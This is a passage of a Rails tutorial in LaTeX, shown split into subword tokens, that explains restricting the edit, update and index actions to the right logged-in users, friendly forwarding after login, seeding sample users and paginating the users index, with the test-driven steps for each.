▁The ▁login ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page .
▁The ▁reason ▁is ▁that ▁the ▁edit ▁and ▁update ▁actions ▁now ▁require ▁a ▁logged - in ▁user , ▁but ▁no ▁user ▁is ▁logged ▁in ▁inside ▁the ▁corresponding ▁tests .
▁We ' ll ▁fix ▁our ▁test ▁suite ▁by ▁logging ▁the ▁user ▁in ▁before ▁hit ting ▁the ▁edit ▁or ▁update ▁actions .
▁This ▁is ▁easy ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁ developed ▁in ▁Section ~\ ref { sec : remember _ tests } ▁( Listing ~\ ref { code : test _ helper _ log _ in }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in }.
▁Logging ▁in ▁a ▁test ▁user .
▁( We ▁could ▁eliminate ▁some ▁duplication ▁by ▁ putting ▁the ▁test ▁login ▁in ▁the ▁\ k ode { setup } ▁method ▁of ▁Listing ~\ ref { code : edit _ tests _ logged _ in }, ▁but ▁in ▁Section ~\ ref { sec : friendly _ forwarding } ▁we ' ll ▁change ▁one ▁of ▁the ▁tests ▁to ▁visit ▁the ▁edit ▁page ▁\ emph { before } ▁logging ▁in , ▁which ▁is n ' t ▁possible ▁if ▁the ▁login ▁step ▁happens ▁during ▁the ▁test ▁setup .)
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁green :
▁Even ▁though ▁our ▁test ▁suite ▁is ▁now ▁passing , ▁we ' re ▁not ▁finished ▁with ▁the ▁before ▁filter , ▁because ▁the ▁suite ▁is ▁ still ▁\ passing \ ▁even ▁if ▁we ▁remove ▁our ▁security ▁model , ▁as ▁you ▁can ▁verify ▁by ▁comment ing ▁it ▁out ▁( Listing ~\ ref { code : comment ed _ out _ before _ filter }).
▁Let ' s ▁write ▁tests ▁to ▁arrange ▁that .
▁ Comment ing ▁out ▁the ▁before ▁filter ▁to ▁test ▁our ▁security ▁model .
▁Because ▁the ▁before ▁filter ▁operat es ▁on ▁a ▁per - action ▁basis , ▁we ' ll ▁put ▁the ▁corresponding ▁tests ▁in ▁the ▁Users ▁controller ▁test . ▁The ▁plan ▁is ▁to ▁hit ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁action ▁with ▁the ▁right ▁kind s ▁of ▁requests ▁and ▁verify ▁that ▁the ▁flash ▁is ▁set ▁and ▁that ▁the ▁user ▁is ▁redirect ed ▁to ▁the ▁login ▁path .
▁ From ▁Table ~\ ref { table : RESTful _ users }, ▁we ▁see ▁that ▁the ▁proper ▁requests ▁are ▁\ text tt { GET } ▁and ▁\ text tt { PATCH }, ▁respectively , ▁which ▁means ▁using ▁the ▁\ k ode { get } ▁and ▁\ k ode { patch } ▁methods ▁inside ▁the ▁tests .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests }.
▁Testing ▁that ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁are ▁ protected .
▁Note ▁the ▁arguments ▁to ▁\ k ode { get } ▁and ▁\ k ode { patch } ▁involve ▁code ▁like
▁This ▁uses ▁the ▁Rails ▁convention ▁of ▁\ k ode { id : ▁@ user }, ▁which ▁( as ▁in ▁controller ▁redirect s ) ▁automatically ▁uses ▁\ k ode {@ user . id }.
▁In ▁the ▁second ▁case , ▁we ▁need ▁to ▁supply ▁an ▁ additional ▁\ k ode { user } ▁hash ▁in ▁order ▁for ▁the ▁routes ▁to ▁work ▁properly .
▁( If ▁you ▁look ▁at ▁the ▁generated ▁Users ▁controller ▁tests ▁from ▁the ▁toy ▁app ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁you ' ll ▁see ▁the ▁code ▁above .)
▁To ▁get ▁it ▁to ▁\ passing , ▁just ▁uncomment ▁the ▁before ▁filter ▁( Listing ~\ ref { code : un comment ed _ before _ filter }).
▁Un comment ing ▁the ▁before ▁filter .
▁With ▁that , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁Any ▁accidental ▁ ex p o s ure ▁of ▁the ▁edit ▁methods ▁to ▁un authorize d ▁users ▁will ▁now ▁be ▁ ca ug h t ▁immediately ▁by ▁our ▁test ▁suite .
▁Of ▁course , ▁requiring ▁users ▁to ▁log ▁in ▁is n ' t ▁quite ▁enough ; ▁users ▁should ▁only ▁be ▁allowed ▁to ▁edit ▁their ▁\ emph { own } ▁information .
▁As ▁we ▁saw ▁in ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁it ' s ▁easy ▁to ▁have ▁a ▁test ▁suite ▁that ▁m is s es ▁an ▁essential ▁security ▁f la w , ▁so ▁we ' ll ▁proceed ▁using ▁test - driven ▁development ▁to ▁be ▁sure ▁our ▁code ▁implement s ▁the ▁security ▁model ▁correctly .
▁To ▁do ▁this , ▁we ' ll ▁add ▁tests ▁to ▁the ▁Users ▁controller ▁test ▁to ▁complement ▁the ▁one s ▁show n ▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests }.
▁In ▁order ▁to ▁make ▁sure ▁users ▁can ' t ▁edit ▁other ▁users ' ▁information , ▁we ▁need ▁to ▁be ▁able ▁to ▁log ▁in ▁as ▁a ▁second ▁user .
▁This ▁means ▁adding ▁a ▁second ▁user ▁to ▁our ▁users ▁fixture ▁file , ▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ second _ user }.
▁ Adding ▁a ▁second ▁user ▁to ▁the ▁fixture ▁file .
▁By ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁we ▁can ▁test ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁as ▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests }.
▁Note ▁that ▁we ▁expect ▁to ▁redirect ▁users ▁to ▁the ▁root ▁path ▁instead ▁of ▁the ▁login ▁path ▁because ▁a ▁user ▁try ing ▁to ▁edit ▁a ▁different ▁user ▁would ▁already ▁be ▁logged ▁in .
▁Tests ▁for ▁try ing ▁to ▁edit ▁as ▁the ▁wrong ▁user .
▁To ▁redirect ▁users ▁try ing ▁to ▁edit ▁another ▁user ' s ▁profile , ▁we ' ll ▁add ▁a ▁second ▁method ▁called ▁\ k ode { correct \_ user }, ▁together ▁with ▁a ▁before ▁filter ▁to ▁call ▁it ▁( Listing ~\ ref { code : correct _ user _ before _ filter }).
▁Note ▁that ▁the ▁\ k ode { correct \_ user } ▁before ▁filter ▁defines ▁the ▁\ k ode {@ user } ▁variable , ▁so ▁Listing ~\ ref { code : correct _ user _ before _ filter } ▁also ▁shows ▁that ▁we ▁can ▁eliminate ▁the ▁\ k ode {@ user } ▁assignment s ▁in ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions .
▁A ▁\ k ode { correct \_ user } ▁before ▁filter ▁to ▁protect ▁the ▁edit / update ▁pages .
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁We ' ll ▁use ▁this ▁method ▁to ▁replace ▁code ▁like
▁with ▁the ▁( slightly ) ▁more ▁express ive
▁The ▁\ k ode { current \_ user ?}\
▁Re placing ▁the ▁direct ▁comparison ▁with ▁the ▁boolean ▁method ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : correct _ user _ before _ filter _ boolean }.
▁The ▁final ▁\ k ode { correct \_ user } ▁before ▁filter .
▁Ou r ▁site ▁authorization ▁is ▁complete ▁as ▁written , ▁but ▁there ▁is ▁one ▁minor ▁blemish : ▁when ▁users ▁try ▁to ▁access ▁a ▁ protected ▁page , ▁they ▁are ▁current ly ▁redirect ed ▁to ▁their ▁profile ▁pages ▁regardless ▁of ▁where ▁they ▁were ▁try ing ▁to ▁go .
▁In ▁other ▁words , ▁if ▁a ▁non - logged - in ▁user ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁after ▁logging ▁in ▁the ▁user ▁will ▁be ▁redirect ed ▁to ▁/ users /1 ▁instead ▁of ▁/ users /1/ edit .
▁It ▁would ▁be ▁much ▁friend li er ▁to ▁redirect ▁them ▁to ▁their ▁intend ed ▁d est in ation ▁instead .
▁The ▁application ▁code ▁will ▁turn ▁out ▁to ▁be ▁relative ly ▁complicated , ▁but ▁we ▁can ▁write ▁a ▁ r id ic ul ous ly ▁simple ▁test ▁for ▁ friendly ▁forwarding ▁just ▁by ▁ r ever s ing ▁the ▁order ▁of ▁logging ▁in ▁and ▁visit ing ▁the ▁edit ▁page ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in }.
▁As ▁seen ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test }, ▁the ▁result ing ▁test ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁the n ▁log s ▁in , ▁and ▁the n ▁check s ▁that ▁the ▁user ▁is ▁redirect ed ▁to ▁the ▁\ emph { edit } ▁page ▁instead ▁of ▁the ▁default ▁profile ▁page .
▁( Listing ~\ ref { code : friendly _ forwarding _ test } ▁also ▁remove s ▁the ▁test ▁for ▁rendering ▁the ▁edit ▁template ▁since ▁that ' s ▁no ▁longer ▁the ▁expected ▁behavior .)
▁A ▁test ▁for ▁ friendly ▁forwarding .
▁Now ▁that ▁we ▁have ▁a ▁failing ▁test , ▁we ' re ▁ready ▁to ▁implement ▁ friendly ▁forwarding
▁The ▁code ▁in ▁this ▁section ▁is ▁ adapt ed ▁from ▁the ▁\ href { http :// github . com / thoughtbot / clear ance }{ C le ar ance } ▁gem ▁by ▁\ href { http :// thoughtbot . com /}{ thoughtbot }.
▁In ▁order ▁to ▁forward ▁users ▁to ▁their ▁intend ed ▁d est in ation , ▁we ▁need ▁to ▁store ▁the ▁location ▁of ▁the ▁request ed ▁page ▁some where , ▁and ▁the n ▁redirect ▁to ▁that ▁location ▁instead ▁of ▁to ▁the ▁default .
▁We ▁accomplish ▁this ▁with ▁a ▁pair ▁of ▁methods , ▁\ k ode { store \_ location } ▁and ▁\ k ode { redirect \_ back \_ or }, ▁both ▁defined ▁in ▁the ▁Sessions ▁helper ▁( Listing ~\ ref { code : friendly _ forwarding _ code }).
▁Code ▁to ▁implement ▁ friendly ▁forwarding .
▁# ▁ Redirect s ▁to ▁store d ▁location ▁( or ▁to ▁the ▁default ).
▁Here ▁the ▁storage ▁ mechanism ▁for ▁the ▁forwarding ▁URL ▁is ▁the ▁same ▁\ k ode { session } ▁facilit y ▁we ▁used ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method } ▁to ▁log ▁the ▁user ▁in .
▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁also ▁uses ▁the ▁\ k ode { request } ▁object ▁( via ▁\ k ode { request . url }) ▁to ▁get ▁the ▁URL ▁of ▁the ▁request ed ▁page .
▁The ▁\ k ode { store \_ location } ▁method ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁put s ▁the ▁request ed ▁URL ▁in ▁the ▁\ k ode { session } ▁variable ▁under ▁the ▁key ▁\ k ode { : forwarding \_ url }, ▁but ▁only ▁for ▁a ▁\ k ode { GET } ▁request .
▁This ▁prevent s ▁storing ▁the ▁forwarding ▁URL ▁if ▁a ▁user , ▁say , ▁submit s ▁a ▁form ▁when ▁not ▁logged ▁in ▁( which ▁is ▁an ▁edge ▁case ▁but ▁could ▁happen ▁if , ▁e . g . , ▁a ▁user ▁deleted ▁the ▁session ▁cookies ▁by ▁hand ▁before ▁ submitting ▁the ▁form ).
▁In ▁such ▁a ▁case , ▁the ▁result ing ▁redirect ▁would ▁issue ▁a ▁\ k ode { GET } ▁request ▁to ▁a ▁URL ▁expect ing ▁\ k ode { POST }, ▁\ k ode { PATCH }, ▁or ▁\ k ode { DELETE }, ▁there by ▁ ca using ▁an ▁error .
▁ Includ ing ▁\ k ode { if ▁request . get ?}\ ▁prevent s ▁this ▁from ▁happen ing
▁T hanks ▁to ▁reader ▁ Y o el ▁A d ler ▁for ▁point ing ▁out ▁this ▁subtle ▁issue , ▁and ▁for ▁ discover ing ▁the ▁solution .
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ store _ location }.
▁ Adding ▁\ k ode { store \_ location } ▁to ▁the ▁logged - in ▁user ▁before ▁filter .
▁To ▁implement ▁the ▁forwarding ▁itself , ▁we ▁use ▁the ▁\ k ode { redirect \_ back \_ or } ▁\ line break ▁method ▁to ▁redirect ▁to ▁the ▁request ed ▁URL ▁if ▁it ▁exists , ▁or ▁some ▁default ▁URL ▁otherwise , ▁which ▁we ▁add ▁to ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁to ▁redirect ▁after ▁successful ▁login ▁( Listing ~\ ref { code : friendly _ session _ create }).
▁The ▁\ k ode { redirect \_ back \_ or } ▁method ▁uses ▁the ▁or ▁operator ~\ k ode {|| } ▁through
▁( Test ing ▁for ▁this ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises }).)
▁Also ▁note ▁that ▁the ▁session ▁deletion ▁occur s ▁even ▁though ▁the ▁line ▁with ▁the ▁redirect ▁appears ▁first ; ▁redirect s ▁don ' t ▁happen ▁un til ▁an ▁explicit ▁\ k ode { return } ▁or ▁the ▁end ▁of ▁the ▁method , ▁so ▁any ▁code ▁appear ing ▁after ▁the ▁redirect ▁is ▁ still ▁executed .
▁The ▁Sessions ▁\ k ode { create } ▁action ▁with ▁ friendly ▁forwarding .
▁With ▁that , ▁the ▁ friendly ▁forwarding ▁integration ▁test ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test } ▁should ▁pass , ▁and ▁the ▁basic ▁user ▁authentication ▁and ▁page ▁protect ion ▁implementation ▁is ▁complete .
▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁\ passing \ ▁before ▁proceeding :
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁\ href { http :// www . an s w ers . com / p en ultimate }{ p en ultimate } ▁user ▁action , ▁the ▁\ k ode { index } ▁action , ▁which ▁is ▁design ed ▁to ▁display ▁\ emph { all } ▁the ▁users ▁instead ▁of ▁just ▁one .
▁A long ▁the ▁way , ▁we ' ll ▁learn ▁how ▁to ▁see d ▁the ▁database ▁with ▁sample ▁users ▁and ▁how ▁to ▁\ emph { paginate } ▁the ▁user ▁output ▁so ▁that ▁the ▁index ▁page ▁can ▁scale ▁up ▁to ▁display ▁a ▁ potentially ▁large ▁number ▁of ▁users .
▁A ▁mockup ▁of ▁the ▁result --- users , ▁pagination ▁links , ▁and ▁a ▁`` Users '' ▁navigation ▁link --- app e ar s ▁in ▁F igure ~\ ref { fig : user _ index _ mockup }
▁A ▁mockup ▁of ▁the ▁users ▁index ▁page .
▁\ label { fig : user _ index _ mockup } }< n >\ end { figure }< n >< n >< n > ▁\ subsection { Users ▁index } ▁% ▁( fold )< n > ▁\ label { sec : users _ index }< n >< n >
▁To ▁get ▁started ▁with ▁the ▁users ▁index , ▁we ' ll ▁first ▁implement ▁a ▁security ▁model .
▁A lthough ▁we ' ll ▁keep ▁individual ▁user ▁\ k ode { show } ▁pages ▁visible ▁to ▁all ▁site ▁visit or s , ▁the ▁user ▁\ k ode { index } ▁will ▁be ▁restrict ed ▁to ▁logged - in ▁users ▁so ▁that ▁there ' s ▁a ▁limit ▁to ▁how ▁much ▁un register ed ▁users ▁can ▁see ▁by ▁default
▁This ▁is ▁the ▁same ▁authorization ▁model ▁used ▁by ▁Twitter .
▁To ▁protect ▁the ▁\ k ode { index } ▁page ▁from ▁un authorize d ▁access , ▁we ' ll ▁first ▁add ▁a ▁short ▁test ▁to ▁verify ▁that ▁the ▁\ k ode { index } ▁action ▁is ▁redirect ed ▁properly ▁( Listing ~\ ref { code : index _ action _ redirect ed _ test }).
▁Testing ▁the ▁\ k ode { index } ▁action ▁redirect .
▁Then ▁we ▁just ▁need ▁to ▁add ▁an ▁\ k ode { index } ▁action ▁and ▁include ▁it ▁in ▁the ▁list ▁of ▁actions ▁ protected ▁by ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter ▁( Listing ~\ ref { code : logged _ in _ user _ index }).
▁ Requir ing ▁a ▁logged - in ▁user ▁for ▁the ▁\ k ode { index } ▁action .
▁To ▁display ▁the ▁users ▁themselves , ▁we ▁need ▁to ▁make ▁a ▁variable ▁containing ▁all ▁the ▁site ' s ▁users ▁and ▁the n ▁render ▁each ▁one ▁by ▁iterat ing ▁through ▁them ▁in ▁the ▁index ▁view .
▁As ▁you ▁may ▁recall ▁from ▁the ▁corresponding ▁action ▁in ▁the ▁toy ▁app ▁( Listing ~\ ref { code : demo _ index _ action }), ▁we ▁can ▁use ▁\ k ode { User . all } ▁to ▁pull ▁all ▁the ▁users ▁out ▁of ▁the ▁database , ▁assign ing ▁them ▁to ▁an ▁\ k ode {@ users } ▁instance ▁variable ▁for ▁use ▁in ▁the ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ index }.
▁( If ▁display ing ▁all ▁the ▁users ▁at ▁once ▁seem s ▁like ▁a ▁ bad ▁idea , ▁you ' re ▁right , ▁and ▁we ' ll ▁remove ▁this ▁blemish ▁in ▁Section ~\ ref { sec : pagination }. )
▁The ▁user ▁\ k ode { index } ▁action .
▁To ▁make ▁the ▁actual ▁index ▁page , ▁we ' ll ▁make ▁a ▁view ▁( w h o se ▁file ▁you ' ll ▁have ▁to ▁create ) ▁that ▁iterate s ▁through ▁the ▁users ▁and ▁wrap s ▁each ▁one ▁in ▁an ~\ k ode { li } ▁tag .
▁We ▁do ▁this ▁with ▁the ▁\ k ode { each } ▁method , ▁display ing ▁each ▁user ' s ▁Gravatar ▁and ▁name , ▁while ▁wrapp ing ▁the ▁whole ▁thing ▁in ▁a ▁\ k ode { ul } ▁tag ▁( Listing ~\ ref { code : user _ index _ view }).
▁The ▁users ▁index ▁view .
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁If ▁you ▁did n ' t ▁do ▁that ▁exercise , ▁update ▁your ▁Users ▁helper ▁file ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁before ▁proceeding .
▁Let ' s ▁also ▁add ▁a ▁little ▁CSS ▁( or , ▁rather , ▁SCSS ) ▁for ▁style ▁( Listing ~\ ref { code : user _ index _ css }).
▁CSS ▁for ▁the ▁users ▁index .
▁F inally , ▁we ' ll ▁add ▁the ▁URL ▁to ▁the ▁users ▁link ▁in ▁the ▁site ' s ▁navigation ▁header ▁using ▁\ k ode { users \_ path }, ▁there by ▁using ▁the ▁last ▁of ▁the ▁un us ed ▁named ▁routes ▁in ▁Table ~\ ref { table : RESTful _ users }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : users _ link }
▁ Adding ▁the ▁URL ▁to ▁the ▁users ▁link .
▁With ▁that , ▁the ▁users ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁\ passing :
▁Let ' s ▁re m ed y ▁this ▁ s ad ▁situation .
▁The ▁users ▁index ▁page ▁with ▁only ▁one ▁user .
▁In ▁this ▁section , ▁we ' ll ▁give ▁our ▁ l one ly ▁sample ▁user ▁some ▁company .
▁Of ▁course , ▁to ▁create ▁enough ▁users ▁to ▁make ▁a ▁d ec ent ▁users ▁index , ▁we ▁\ emph { co ul d } ▁use ▁our ▁web ▁browser ▁to ▁visit ▁the ▁signup ▁page ▁and ▁make ▁the ▁new ▁users ▁one ▁by ▁one , ▁but ▁a ▁far ▁better ▁solution ▁is ▁to ▁use ▁Ruby ▁( and ▁Rake ) ▁to ▁make ▁the ▁users ▁for ▁us .
▁Then ▁install ▁as ▁usual :
▁Next , ▁we ' ll ▁add ▁a ▁Rake ▁task ▁to ▁see d ▁the ▁database ▁with ▁sample ▁users , ▁for ▁which ▁Rails ▁uses ▁the ▁standard ▁location ▁\ k ode { db / seed s . rb }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : db _ seed }
▁( The ▁code ▁in ▁Listing ~\ ref { code : db _ seed } ▁is ▁a ▁bit ▁advanced , ▁so ▁don ' t ▁worry ▁too ▁much ▁about ▁the ▁details .)
▁A ▁Rake ▁task ▁for ▁see d ing ▁the ▁database ▁with ▁sample ▁users .
▁The ▁code ▁in ▁Listing ~\ ref { code : db _ seed } ▁creates ▁an ▁example ▁user ▁with ▁name ▁and ▁email ▁address ▁re p li cat ing ▁our ▁previous ▁one , ▁and ▁the n ▁make s ▁ 99 ▁more .
▁The ▁\ k ode { create ! } \ ▁method ▁is ▁just ▁like ▁the ▁\ k ode { create } ▁method , ▁except ▁it ▁raise s ▁an ▁exception ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁for ▁an ▁invalid ▁user ▁rather ▁than ▁return ing ▁\ k ode { false }.
▁This ▁behavior ▁make s ▁debugging ▁easier ▁by ▁avoid ing ▁ s il ent ▁errors .
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : db _ seed }, ▁we ▁can ▁reset ▁the ▁database ▁and ▁the n ▁invoke ▁the ▁Rake ▁task ▁using ▁\ k ode { db : seed }
▁In ▁principle , ▁these ▁two ▁task s ▁can ▁be ▁combine d ▁in ▁\ k ode { rake ▁db : reset }, ▁but ▁as ▁of ▁this ▁writing ▁this ▁command ▁does n ' t ▁work ▁with ▁the ▁latest ▁version ▁of ▁Rails .
▁See d ing ▁the ▁database ▁can ▁be ▁ s low , ▁and ▁on ▁some ▁systems ▁could ▁take ▁up ▁to ▁a ▁few ▁minutes .
▁After ▁running ▁the ▁\ k ode { db : seed } ▁Rake ▁task , ▁our ▁application ▁has ▁100 ▁sample ▁users .
▁As ▁seen ▁in ▁F igure ~\ ref { fig : user _ index _ all }, ▁I ' ve ▁take n ▁the ▁ lib er t y ▁of ▁associat ing ▁the ▁first ▁few ▁sample ▁addresses ▁with ▁Gravatar s ▁so ▁that ▁they ' re ▁not ▁all ▁the ▁default ▁Gravatar ▁image .
▁( You ▁may ▁have ▁to ▁restart ▁the ▁webserver ▁at ▁this ▁point .)
▁The ▁users ▁index ▁page ▁with ▁100 ▁sample ▁users .
▁Ou r ▁original ▁user ▁does n ' t ▁ s u ff er ▁from ▁ l one line s s ▁any ▁more , ▁but ▁now ▁we ▁have ▁the ▁oppos ite ▁problem : ▁our ▁user ▁has ▁\ emph { to o ▁many } ▁com p an ion s , ▁and ▁they ▁all ▁appear ▁on ▁the ▁same ▁page .
▁R ight ▁now ▁there ▁are ▁a ▁h un d r ed , ▁which ▁is ▁already ▁a ▁reasonabl y ▁large ▁number , ▁and ▁on ▁a ▁real ▁site ▁it ▁could ▁be ▁ th ous and s .
▁The ▁solution ▁is ▁to ▁\ emph { paginate } ▁the ▁users , ▁so ▁that ▁( for ▁example ) ▁only ▁30 ▁show ▁up ▁on ▁a ▁page ▁at ▁any ▁one ▁time .
▁There ▁are ▁sever al ▁pagination ▁methods ▁in ▁Rails ; ▁we ' ll ▁use ▁one ▁of ▁the ▁simplest ▁and ▁most ▁ r ob us t , ▁called ▁\ href { http :// wiki . github . com / m is la v / will _ paginate /}{ will \_ paginate }.
▁in ▁Listing ~\ ref { code : will _ paginate _ gem }.
▁Then ▁run ▁\ k ode { bundle ▁install } :
▁You ▁should ▁also ▁restart ▁the ▁web ▁server ▁to ▁ensure ▁that ▁the ▁new ▁gems ▁are ▁loaded ▁properly .
▁To ▁get ▁pagination ▁working , ▁we ▁need ▁to ▁add ▁some ▁code ▁to ▁the ▁index ▁view ▁tell ing ▁Rails ▁to ▁ paginate ▁the ▁users , ▁and ▁we ▁need ▁to ▁replace ▁\ k ode { User . all } ▁in ▁the ▁\ k ode { index } ▁action ▁with ▁an ▁object ▁that ▁know s ▁about ▁pagination .
▁We ' ll ▁start ▁by ▁adding ▁the ▁special ▁\ k ode { will \_ paginate } ▁method ▁in ▁the ▁view ▁( Listing ~\ ref { code : will _ paginate _ index _ view }) ; ▁we ' ll ▁see ▁in ▁a ▁moment ▁why ▁the ▁code ▁appears ▁both ▁above ▁and ▁below ▁the ▁user ▁list .
▁The ▁users ▁index ▁with ▁pagination .
▁The ▁\ k ode { will \_ paginate } ▁method ▁is ▁a ▁little ▁magic al ; ▁inside ▁a ▁\ k ode { users } ▁view , ▁it ▁automatically ▁look s ▁for ▁an ▁\ k ode {@ users } ▁object , ▁and ▁the n ▁display s ▁pagination ▁links ▁to ▁access ▁other ▁pages .
▁The ▁view ▁in ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁does n ' t ▁work ▁yet , ▁though , ▁because ▁current ly ▁\ k ode {@ users } ▁contains ▁the ▁results ▁of ▁\ k ode { User . all } ▁( Listing ~\ ref { code : user _ index }), ▁whereas ▁\ k ode { will \_ paginate } ▁requires ▁that ▁we ▁ paginate ▁the ▁results ▁explicitly ▁using ▁the ▁\ k ode { paginate } ▁method :
▁Note ▁that ▁\ k ode { paginate } ▁take s ▁a ▁hash ▁argument ▁with ▁key ▁\ k ode { : page } ▁and ▁value ▁equal ▁to ▁the ▁page ▁request ed .
▁So , ▁for ▁example , ▁page ~ 1 ▁is ▁users ▁1 - -30 , ▁page ~ 2 ▁is ▁users ▁31 - - 60 , ▁etc . ▁If ▁\ k ode { page } ▁is ▁\ k ode { nil }, ▁\ k ode { paginate } ▁simply ▁returns ▁the ▁first ▁page .
▁Using ▁the ▁\ k ode { paginate } ▁method , ▁we ▁can ▁ paginate ▁the ▁users ▁in ▁the ▁sample ▁application ▁by ▁using ▁\ k ode { paginate } ▁in ▁place ▁of ▁\ k ode { all } ▁in ▁the ▁\ k ode { index } ▁action ▁( Listing ~\ ref { code : will _ paginate _ index _ action }).
▁Here ▁the ▁\ k ode { page } ▁parameter ▁comes ▁from ▁\ k ode { params [: page ]} , ▁which ▁is ▁generated ▁automatically ▁by ▁\ k ode { will \_ paginate }.
▁P a g in at ing ▁the ▁users ▁in ▁the ▁\ k ode { index } ▁action .
▁The ▁users ▁index ▁page ▁should ▁now ▁be ▁working , ▁appear ing ▁as ▁in ▁F igure ~\ ref { fig : user _ index _ pagination }.
▁( O n ▁some ▁systems , ▁you ▁may ▁have ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point .)
▁Because ▁we ▁included ▁\ k ode { will \_ paginate } ▁both ▁above ▁and ▁below ▁the ▁user ▁list , ▁the ▁pagination ▁links ▁appear ▁in ▁both ▁place s .
▁The ▁users ▁index ▁page ▁with ▁pagination .
▁If ▁you ▁now ▁click ▁on ▁either ▁the ~\ href { http :// localhost :3000/ users ? page = 2 }{ 2 } ▁link ▁or ▁\ href { http :// localhost :3000/ users ? page = 2 }{ N ext } ▁link , ▁you ' ll ▁get ▁the ▁second ▁page ▁of ▁results , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : user _ index _ page _ two _ rails _3} .
▁P age ▁2 ▁of ▁the ▁users ▁index .
▁Now ▁that ▁our ▁users ▁index ▁page ▁is ▁working , ▁we ' ll ▁write ▁a ▁light we ight ▁test ▁for ▁it , ▁including ▁a ▁minimal ▁test ▁for ▁the ▁pagination ▁from ▁Section ~\ ref { sec : pagination }.
▁The ▁idea ▁is ▁to ▁log ▁in , ▁visit ▁the ▁index ▁path , ▁verify ▁the ▁first ▁page ▁of ▁users ▁is ▁present , ▁and ▁the n ▁confirm ▁that ▁pagination ▁is ▁present ▁on ▁the ▁page .
▁For ▁these ▁last ▁two ▁steps ▁to ▁work , ▁we ▁need ▁to ▁have ▁enough ▁users ▁in ▁the ▁test ▁database ▁to ▁invoke ▁pagination , ▁i . e . , ▁more ▁than ▁30 .
▁We ▁created ▁a ▁second ▁user ▁in ▁the ▁fixtures ▁in ▁Listing ~\ ref { code : fixture _ second _ user }, ▁but ▁30 ▁or ▁so ▁more ▁users ▁is ▁a ▁lot ▁to ▁create ▁by ▁hand .
▁L uckily , ▁as ▁we ' ve ▁seen ▁with ▁the ▁user ▁fixture ' s ▁\ k ode { password \_ digest } ▁attribute , ▁fixture ▁files ▁support ▁ embedded ▁Ruby , ▁which ▁\ line break ▁means ▁we ▁can ▁create ▁30 ▁ additional ▁users ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ fixtures _ ext ra _ users }.
▁( Listing ~\ ref { code : users _ fixtures _ ext ra _ users } ▁also ▁creates ▁a ▁couple ▁of ▁other ▁named ▁users ▁for ▁future ▁reference .)
▁ Adding ▁30 ▁extra ▁users ▁to ▁the ▁fixture .
▁With ▁the ▁fixtures ▁defined ▁in ▁Listing ~\ ref { code : users _ fixtures _ ext ra _ users }, ▁we ' re ▁ready ▁to ▁write ▁a ▁test ▁of ▁the ▁users ▁index .
▁First ▁we ▁generate ▁the ▁relevant ▁test :
▁The ▁test ▁itself ▁involve s ▁check ing ▁for ▁a ▁\ k ode { div } ▁with ▁the ▁required ▁\ k ode { pagination } ▁class ▁and ▁verify ing ▁that ▁the ▁first ▁page ▁of ▁users ▁is ▁present .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ index _ test }
▁A ▁test ▁of ▁the ▁users ▁index , ▁including ▁pagination .
▁The ▁result ▁should ▁be ▁a ▁\ passing \ ▁test ▁suite :
▁The ▁ paginate d ▁users ▁index ▁is ▁now ▁complete , ▁but ▁there ' s ▁one ▁improve ment ▁I ▁can ' t ▁re s ist ▁including : ▁Rails ▁has ▁some ▁in credibly ▁ s li c k ▁tool s ▁for ▁making ▁compact ▁views , ▁and ▁in ▁this ▁section ▁we ' ll ▁refactor ▁the ▁index ▁page ▁to ▁use ▁them .
